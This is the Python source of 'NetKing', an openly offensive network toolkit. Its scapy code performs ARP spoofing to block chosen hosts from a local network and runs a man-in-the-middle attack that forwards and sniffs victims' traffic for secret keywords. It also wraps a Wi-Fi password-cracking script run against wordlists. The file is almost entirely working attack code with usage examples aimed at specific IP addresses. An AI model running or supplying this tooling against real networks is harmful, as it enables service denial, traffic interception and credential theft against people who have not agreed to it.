from scapy.all import *
import argparse
import time
import os
import threading
from colorama import Fore, Style, init
init(autoreset=True)
from modules.scan_network import scan_network, display
import logging
import subprocess
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from modules.sniffer import sniffer

def get_options():
    parser = argparse.ArgumentParser(
        prog='netking.py',
        description=(
            f"{Fore.CYAN}NetKing: Advanced Network Toolkit\n"
            f"{Fore.YELLOW}Scan, block, sniff, and crack Wi-Fi networks with ease.{Style.RESET_ALL}\n\n"
            "Examples:\n"
            "  Scan network:    sudo python netking.py --scan --range 192.168.1.1/24 --interface wlan0\n"
            "  Block users:     sudo python netking.py --block 192.168.1.10,192.168.1.20 -r 192.168.1.1 --interface wlan0\n"
            "  Sniff traffic:   sudo python netking.py --sniff 192.168.1.10 -r 192.168.1.1 --interface wlan0\n"
            "  Crack Wi-Fi:     sudo python netking.py crack -i wlan1 -w /path/to/wordlist.txt\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )
    subparsers = parser.add_subparsers(dest='command', help='Available subcommands')

    # Main options
    parser.add_argument('--keywords', help='File with secret keywords to detect in sniffed packets')
    parser.add_argument('-r', metavar='ROUTER_IP', type=str, help='Router IP address (required for block/sniff)')
    parser.add_argument('--interface', metavar='IFACE', type=str, help='Network interface to use (e.g., wlan0)')
    parser.add_argument('--scan', action='store_true', help='Scan the network for active hosts')
    parser.add_argument('--range', metavar='IP_RANGE', type=str, help='IP range to scan (e.g., 192.168.1.1/24)')
    parser.add_argument('--timeout', type=int, default=8, help='Timeout for ARP scan (default: 8 seconds)')
    parser.add_argument('--block', metavar='IP_LIST', type=str, help='Block users (comma-separated IPs)')
    parser.add_argument('--sniff', metavar='IP_LIST', type=str, help='Sniff packets from specified IPs (comma-separated)')

    # Crack subcommand
    crack_parser = subparsers.add_parser(
        'crack',
        help='Run crack.sh to attempt Wi-Fi password cracking',
        description=(
            "Run Wi-Fi password cracking using crack.sh.\n"
            "Example:\n"
            "  sudo python netking.py crack -i wlan1 -w /usr/share/wordlists/rockyou.txt"
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )
    crack_parser.add_argument('-i', '--interface', required=True, metavar='IFACE', help='Wireless interface in monitor mode')
    crack_parser.add_argument('-w', '--wordlist', required=True, metavar='WORDLIST', help='Path to password wordlist')

    return parser.parse_args()

def mac_scan(ip, iface=None):
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = ARP(pdst=ip)
    packet = arp_broadcast / arp_request
    answered, unanswered = srp(packet, timeout=5, verbose=False, iface=iface)
    if len(answered) == 0:
        print(Fore.LIGHTYELLOW_EX + f"[-] No response from {ip}. Is the device online?" + Style.RESET_ALL)
        return None
    return answered[0][1].hwsrc

def spoof(ip_target, router_ip, iface=None):
    target_mac = mac_scan(ip_target, iface)
    if target_mac:
        packet = ARP(op=2, pdst=ip_target, hwdst=target_mac, psrc=router_ip)
        send(packet, verbose=False, iface=iface)
        #print(Fore.BLUE + "[+] Evil packets sent" + Style.RESET_ALL)

def restore(destination_ip, source_ip, iface=None):
    destination_mac = mac_scan(destination_ip, iface)
    source_mac = mac_scan(source_ip, iface)
    if destination_mac and source_mac:
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False, count=8, iface=iface)

def block_all(ip_list_str, router_ip, iface=None):
    ip_list = ip_list_str.split(",")
    print(Fore.WHITE + "[*] Starting to block the following IPs:" + Style.RESET_ALL)
    for ip in ip_list:
        print(Fore.RED + "-----------> " + ip.strip() + " 💀" + Style.RESET_ALL)
    try:
        while True:
            for ip in ip_list:
                ip = ip.strip()
                spoof(ip, router_ip, iface)
                print(Fore.BLUE + "[+] 😈 Evil packets sent" + Style.RESET_ALL)
                spoof(router_ip, ip, iface)
                print(Fore.BLUE + "[+] 😈 Evil packets sent" + Style.RESET_ALL)
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Ctrl+C detected. Restoring ARP tables...")
        for ip in ip_list:
            ip = ip.strip()
            restore(ip, router_ip, iface)
            restore(router_ip, ip, iface)
def enable_ip_forwarding():

    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print(Fore.GREEN + "[+] IP forwarding enabled" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Failed to enable IP forwarding: {e}" + Style.RESET_ALL)
   

def disable_ip_forwarding():
    
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print(Fore.GREEN + "[+] IP forwarding disabled" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Failed to disable IP forwarding: {e}" + Style.RESET_ALL)
def mim_attack(ip_list_str, router_ip, iface=None, opts=None):
    ip_list = ip_list_str.split(",")
    
    print(Fore.WHITE + "[*] Starting to sniff the following IPs:" + Style.RESET_ALL)
    for ip in ip_list:
        print(Fore.RED + "-----------> " + ip.strip() + " 💀" + Style.RESET_ALL)
        thread = threading.Thread(target=sniffer, args=(iface, opts))
        thread.start()
    try:
        enable_ip_forwarding()
        print(Fore.BLUE + "[+]sniff..." + Style.RESET_ALL)
        while True:
            for ip in ip_list:
                ip = ip.strip()
                spoof(ip, router_ip, iface)
                spoof(router_ip, ip, iface)
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Ctrl+C detected. Restoring ARP tables...")
        for ip in ip_list:
            ip = ip.strip()
            restore(ip, router_ip, iface)
            restore(router_ip, ip, iface)
        disable_ip_forwarding()

def run_crack(interface, wordlist):
    crack_script = os.path.join(os.path.dirname(__file__), 'modules/crack.sh')
    if not os.path.isfile(crack_script):
        print(Fore.RED + f"[-] crack.sh not found at {crack_script}" + Style.RESET_ALL)
        return
    try:
        print(Fore.GREEN + f"[+] Running crack.sh on {interface} with wordlist {wordlist}" + Style.RESET_ALL)
        subprocess.run(['bash', crack_script, '-i', interface, '-w', wordlist], check=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[-] crack.sh failed: {e}" + Style.RESET_ALL)

def main():
    if os.geteuid() != 0:
        print(Fore.RED + "[-] Run the script as root.")
        exit(1)

    opts = get_options()

    # Handle crack subcommand
    if hasattr(opts, 'command') and opts.command == 'crack':
        run_crack(opts.interface, opts.wordlist)
        return

    if opts.scan:
        if not opts.range:
            print(Fore.RED + "[-] Specify a range with --range.")
            exit(1)
        clients = scan_network(opts.range, opts.timeout, opts.interface)
        display(clients)
    elif opts.block:
        if not opts.r:
            print(Fore.RED + "[-] You must specify router IP with -r when using --block.")
            exit(1)
        block_all(opts.block, opts.r, opts.interface)
    elif opts.sniff:
        if not opts.r:
            print(Fore.RED + "[-] You must specify router IP with -r when using --sniff.")
            exit(1)
        mim_attack(opts.sniff, opts.r, opts.interface, opts)
    else:
        print(Fore.RED + "[-] Invalid arguments. Use --scan, --block, or --sniff.")
        exit(1)

if __name__ == "__main__":
    main()